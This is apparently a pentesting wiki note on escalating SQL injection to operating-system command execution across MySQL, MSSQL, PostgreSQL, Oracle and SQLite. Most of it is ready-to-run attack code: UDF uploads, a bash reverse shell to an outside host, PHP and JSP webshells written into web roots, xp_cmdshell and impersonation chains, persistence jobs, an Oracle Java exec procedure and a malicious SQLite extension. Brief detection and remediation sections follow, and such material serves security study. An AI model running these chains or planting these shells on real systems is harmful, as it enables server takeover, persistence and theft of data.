---
title: Database RCE from SQL injection
slug: database-rce-from-sqli
aliases: [sqli-to-rce, database-rce, rce-from-sqli]
---

> **TL;DR:** SQL injection in MySQL, MSSQL, PostgreSQL, Oracle, or SQLite can escalate to OS command execution through database-native features — UDFs, xp_cmdshell, COPY PROGRAM, DBMS_SCHEDULER, or load_extension — turning a data-layer bug into full system compromise.

## What it is
Every major RDBMS ships features that bridge the database layer to the operating system: user-defined functions that call C libraries, job schedulers that run OS commands, file I/O primitives that write to the web root or crontabs, and outbound network calls. When SQL injection gives enough privilege, these features provide reliable RCE. This note covers the specific chain for each database engine — the "SQLi → shell" playbook. See [[postgresql-exploitation]] for the PostgreSQL deep-dive.

## Preconditions / where it applies
- SQL injection with sufficient privileges (DBA / superuser / sa) or ability to escalate.
- Stacked queries support (needed for most chains; available by default in MSSQL, PostgreSQL, SQLite; requires specific drivers in MySQL and Oracle).
- For file-write chains: writable path on the filesystem (web root for webshell, `/tmp` for UDF).
- For OOB chains: outbound network from the DB server (DNS at minimum).

## Technique

### 1 — MySQL: UDF via INTO DUMPFILE

MySQL's `INTO DUMPFILE` writes binary data to a file. Upload a UDF shared library to the plugin directory:

```sql
-- Check architecture and plugin directory
SELECT @@version;
SELECT @@plugin_dir;
-- Typical: /usr/lib/mysql/plugin/ or /usr/lib64/mysql/plugin/

-- Check FILE privilege
SELECT file_priv FROM mysql.user WHERE user=current_user();
```

The UDF library (`lib_mysqludf_sys.so` or `.dll`) is embedded as hex in the payload:

```sql
-- Write UDF shared library (hex of compiled .so)
SELECT UNHEX('7f454c46...') INTO DUMPFILE '/usr/lib/mysql/plugin/udf_exec.so';

-- Register the function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf_exec.so';

-- Execute commands
SELECT sys_exec('id > /tmp/pwned');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"');

-- Cleanup
DROP FUNCTION sys_exec;
```

Alternative file-write for webshell (no UDF needed):

```sql
-- Write PHP webshell to web root
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Via UNION injection
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'-- -
```

Tooling shortcut:

```bash
# sqlmap OS shell
sqlmap -u "https://target/?id=1" --os-shell --dbms=MySQL

# sqlmap UDF
sqlmap -u "https://target/?id=1" --udf-inject
```

### 2 — MSSQL: xp_cmdshell and sp_OACreate

`xp_cmdshell` is disabled by default but can be re-enabled by `sa` or `sysadmin` members:

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <base64_revshell>';

-- If xp_cmdshell is blocked, use sp_OACreate (OLE Automation)
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', null, 'cmd /c whoami > C:\inetpub\wwwroot\out.txt';
```

Privilege escalation if not `sa`:

```sql
-- Check current role
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Impersonation chain
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';

-- Via linked servers
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- Find impersonatable logins
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
```

Agent jobs for persistence (requires SQL Server Agent running):

```sql
USE msdb;
EXEC sp_add_job @job_name = 'cmd';
EXEC sp_add_jobstep @job_name = 'cmd', @step_name = 'exec',
  @subsystem = 'CmdExec', @command = 'whoami > C:\out.txt';
EXEC sp_add_jobserver @job_name = 'cmd';
EXEC sp_start_job @job_name = 'cmd';
```

### 3 — PostgreSQL: COPY TO PROGRAM and UDFs

See [[postgresql-exploitation]] for the full breakdown. Summary:

```sql
-- Direct RCE (superuser)
COPY cmd_output FROM PROGRAM 'id';

-- UDF via C extension upload through large objects
-- (compile .so, upload via lo_import, lo_export to /tmp, CREATE FUNCTION)

-- File read
SELECT pg_read_file('/etc/passwd');

-- Webshell
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';
```

### 4 — Oracle: DBMS_SCHEDULER and Java procedures

Oracle can execute OS commands through the job scheduler or embedded Java:

```sql
-- DBMS_SCHEDULER (requires CREATE JOB privilege)
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'RCE_JOB',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled    => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('RCE_JOB', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('RCE_JOB', 2, 'id > /tmp/pwned');
  DBMS_SCHEDULER.ENABLE('RCE_JOB');
END;
/

-- Java stored procedure (requires CREATE PROCEDURE + JAVAUSERPRIV)
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "RCE" AS
import java.io.*;
public class RCE {
  public static String exec(String cmd) throws Exception {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) sb.append(line).append("\n");
    return sb.toString();
  }
};
/

CREATE OR REPLACE FUNCTION os_exec(cmd VARCHAR2) RETURN VARCHAR2 AS
  LANGUAGE JAVA NAME 'RCE.exec(java.lang.String) return java.lang.String';
/

SELECT os_exec('id') FROM dual;
```

Oracle file write via `UTL_FILE`:

```sql
-- Requires a directory object pointing to a writable path
CREATE OR REPLACE DIRECTORY WEBROOT AS '/var/www/html';
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('WEBROOT', 'shell.jsp', 'W');
  UTL_FILE.PUT_LINE(f, '<% Runtime.getRuntime().exec(request.getParameter("c")); %>');
  UTL_FILE.FCLOSE(f);
END;
/
```

### 5 — SQLite: load_extension

SQLite can load shared libraries if `load_extension` is enabled (disabled by default in most bindings, but enabled in some PHP/Python configurations):

```sql
-- Check if enabled (will error if disabled)
SELECT load_extension('/tmp/evil.so', 'sqlite3_evil_init');
```

Compile the extension:

```c
/* evil.c */
#include <stdlib.h>
#include <sqlite3ext.h>
SQLITE_EXTENSION_INIT1
int sqlite3_evil_init(sqlite3 *db, char **err, const sqlite3_api_routines *api) {
    SQLITE_EXTENSION_INIT2(api);
    system("id > /tmp/pwned");
    return SQLITE_OK;
}
```

```bash
gcc -shared -fPIC -o evil.so evil.c
```

Upload the `.so` via another vulnerability (file upload, path traversal write), then trigger via SQLi. Alternatively, use SQLite's `.import` or `ATTACH DATABASE` for file write:

```sql
-- Write to a file via ATTACH
ATTACH DATABASE '/var/www/html/shell.php' AS pwned;
CREATE TABLE pwned.x (data TEXT);
INSERT INTO pwned.x VALUES ('<?php system($_GET["c"]); ?>');
```

### 6 — Cross-database comparison matrix

| Feature              | MySQL          | MSSQL              | PostgreSQL       | Oracle             | SQLite          |
|---------------------|----------------|--------------------|-----------------|--------------------|-----------------|
| OS command           | UDF sys_exec   | xp_cmdshell        | COPY PROGRAM    | DBMS_SCHEDULER     | load_extension  |
| File read            | LOAD_FILE()    | OPENROWSET         | pg_read_file()  | UTL_FILE           | readfile()      |
| File write           | INTO OUTFILE   | sp_OAMethod        | COPY TO         | UTL_FILE           | ATTACH DATABASE |
| DNS exfil            | LOAD_FILE(UNC) | xp_dirtree(UNC)    | dblink          | UTL_HTTP           | N/A             |
| Stacked queries      | Driver-dep.    | Yes                | Yes             | PL/SQL block       | Yes             |
| Privilege needed     | FILE / SUPER   | sysadmin / sa      | Superuser       | DBA + Java priv    | load_ext enabled|

## Detection / blue-team
- Monitor for `xp_cmdshell`, `sp_OACreate`, `sp_configure` in MSSQL audit logs.
- PostgreSQL: watch for `COPY ... PROGRAM`, `CREATE FUNCTION ... LANGUAGE C`, `lo_export` in `pg_audit`.
- MySQL: audit `SELECT ... INTO OUTFILE/DUMPFILE`, `CREATE FUNCTION ... SONAME`.
- Oracle: audit `DBMS_SCHEDULER.CREATE_JOB`, Java stored procedure creation.
- File integrity monitoring on web roots, plugin directories, and `/tmp`.
- Egress monitoring: unexpected DNS or HTTP from database servers.

## Remediation
- Application database accounts with least privilege: no `FILE`, no `sysadmin`, no `superuser`, no `CREATE JOB`.
- Disable dangerous features: `xp_cmdshell` off, `Ole Automation Procedures` off, `load_extension` disabled.
- Parameterized queries eliminate the injection vector.
- Network segmentation: database servers on isolated VLANs with no internet egress.
- Web application firewalls as defense-in-depth for known SQLi patterns.

## References
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) — per-DB payloads
- [HackTricks — MSSQL Pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html) — xp_cmdshell chains
- [HackTricks — PostgreSQL RCE](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html)
- [ired.team — MSSQL to RCE](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets/sql-injection-mssql-cheatsheet)

See also: [[sql-injection]], [[sql-injection-by-database]], [[postgresql-exploitation]], [[blind-sqli-techniques]], [[command-injection]], [[mssql-xp-cmdshell-impersonation-chains]], [[mssql-trusted-links]]
